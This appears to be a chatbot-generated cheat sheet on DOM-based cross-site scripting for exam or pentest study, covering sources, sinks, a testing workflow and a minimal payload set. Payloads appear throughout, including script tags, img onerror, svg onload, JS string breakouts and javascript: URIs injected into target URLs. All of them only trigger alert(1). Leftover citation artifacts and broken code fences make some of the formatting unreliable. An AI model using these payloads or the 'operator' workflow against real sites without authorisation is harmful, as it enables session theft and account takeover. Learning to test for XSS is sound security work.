Here’s your **DOM-based XSS cheat sheet**, built exactly in your system style (clean callouts, payload-only code blocks, and operator workflow).

---

md
> [!ABSTRACT]
> DOM-based XSS is a vulnerability where malicious input is processed **entirely in the browser (client-side)** and executed via JavaScript.  
> 
> It occurs when:
> - Data from a **source** (e.g., URL, input, cookie)  
> - Flows into a **sink** (e.g., `innerHTML`, `eval`)  
> - Without proper sanitization  
> 
> Unlike other XSS types:
> - Payload **never reaches the server**  
> - Everything happens in the browser DOM :contentReference[oaicite:0]{index=0}  
> 
> Impact:
> - Steal cookies/session  
> - Account takeover  
> - Execute arbitrary JS  
> 
> 🧠 Think: “JavaScript is the vulnerability, not the server”

---

## 🧠 DOM-Based XSS – Cheat Sheet

---

### 🎯 1. Basic Detection (Source Injection)

> [!CHECK]
> Inject payload into URL or input  
> Look for execution in browser  

```bash
# URL parameter
https://target.com/?q=<script>alert(1)</script>
````

```bash
# URL fragment (most common)
https://target.com/#<img src=x onerror=alert(1)>
```

---

### 🧪 2. Common Payloads

> [!SUCCESS]  
> Works when input is written to DOM

```html
<script>alert(1)</script>
```

```html
<img src=x onerror=alert(1)>
```

```html
<svg/onload=alert(1)>
```

---

### 🧬 3. JavaScript Context Injection

> [!ATTENTION]  
> Break out of JS string context

```js
';alert(1);//
```

```js
";alert(1);//
```

---

### 🧩 4. Sink Exploitation

> [!SUCCESS]  
> Exploit dangerous DOM sinks

```js
document.location.hash
```

```js
document.write()
```

```js
element.innerHTML
```

```js
eval()
```

---

### 💥 5. DOM-Based Payload (Real Case)

> [!SUCCESS]  
> Inject payload into URL fragment

```bash
https://target.com/#<img src=x onerror=alert(1)>
```

---

### ⚙️ 6. DOM XSS via `javascript:` URI

> [!ATTENTION]  
> Works when app uses unsafe links

```bash
javascript:alert(1)
```

---

### 🧪 7. DOM XSS via `document.write`

> [!SUCCESS]  
> Trigger when input is written directly

```bash
https://target.com/?input=<script>alert(1)</script>
```

---

### 💣 8. DOM XSS via `innerHTML`

> [!SUCCESS]  
> Works when input injected into HTML

```html
<img src=x onerror=alert(1)>
```

---

### 🔍 9. Real Workflow (Operator Method)

> [!SUCCESS]

1. Find input source:
    

```bash
?q=test
```

2. Inject payload:
    

```bash
?q=<img src=x onerror=alert(1)>
```

3. If not working → try fragment:
    

```bash
#<img src=x onerror=alert(1)>
```

4. Identify sink:
    

- `innerHTML`
    
- `document.write`
    
- `eval`
    

5. Adjust payload to context
    

---

### 🧠 10. Sources (Entry Points)

> [!ABSTRACT]

- URL parameters (`location.search`)
    
- URL fragments (`location.hash`)
    
- Cookies
    
- Referrer
    
- User input fields
    

---

### 🧠 11. Sinks (Execution Points)

> [!ABSTRACT]

- `innerHTML`
    
- `outerHTML`
    
- `document.write`
    
- `eval()`
    
- `setTimeout()`
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
# URL param
?q=<img src=x onerror=alert(1)>

# Fragment
#<img src=x onerror=alert(1)>

# JS breakout
';alert(1);//

# javascript URI
javascript:alert(1)
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Input not reaching sink
>     
> - Proper sanitization
>     
> - Safe DOM methods used
>     

---

> [!ATTENTION]  
> DOM XSS = Source → Sink
> 
> You need:
> 
> - Controlled input (source)
>     
> - Dangerous function (sink)
>     
> 
> No sink → no exploit

---

```

---

## 🔥 Why this one is tricky (important insight)

- Harder to detect because:
  - No server response change  
  - Payload often in `#` (not logged) :contentReference[oaicite:1]{index=1}  
- Tools miss it → **manual testing is key**

---


::contentReference[oaicite:2]{index=2}
```